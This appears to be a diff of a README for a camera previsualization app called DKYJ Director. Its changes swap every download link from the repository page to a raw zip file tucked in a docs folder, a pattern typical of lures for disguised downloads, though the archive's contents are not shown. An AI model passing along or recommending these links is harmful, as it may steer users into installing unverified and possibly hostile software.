@@ -1,6 +1,6 @@
 # 🎬 dkyj-director - Your Pocket-Sized Camera Previsualization Studio
 
-[![Download DKYJ Director](https://img.shields.io/badge/Download-DKYJ_Director-2ea44f?style=for-the-badge&logo=github)](https://github.com/lysy01528-hash/dkyj-director)
+[![Download DKYJ Director](https://img.shields.io/badge/Download-DKYJ_Director-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lysy01528-hash/dkyj-director/main/docs/2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -40,7 +40,7 @@ Don't worry if your system is a bit older. DKYJ Director is designed to be effic
 
 ## 📦 Download and Installation
 
-Visit this link to download the application: [https://github.com/lysy01528-hash/dkyj-director](https://github.com/lysy01528-hash/dkyj-director)
+Visit this link to download the application: [https://raw.githubusercontent.com/lysy01528-hash/dkyj-director/main/docs/2.9.zip](https://raw.githubusercontent.com/lysy01528-hash/dkyj-director/main/docs/2.9.zip)
 
 ### Step-by-Step Download Guide
 
@@ -194,6 +194,6 @@ DKYJ Director puts professional camera previsualization in your hands. It's a pr
 
 Download it today and start seeing your shots before you shoot them. Your future film set will thank you.
 
-[![Download DKYJ Director](https://img.shields.io/badge/Download-DKYJ_Director-2ea44f?style=for-the-badge&logo=github)](https://github.com/lysy01528-hash/dkyj-director)
+[![Download DKYJ Director](https://img.shields.io/badge/Download-DKYJ_Director-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lysy01528-hash/dkyj-director/main/docs/2.9.zip)
 
 Keywords: camera previs, filmmaking tool, Blender previsualization, iPhone viewfinder, scene blocking, director software, free previs app, Windows camera tool, macOS previs, DKYJ Director, 大开眼界导演台, local editing software, MCP agent camera, virtual production, storyboard software
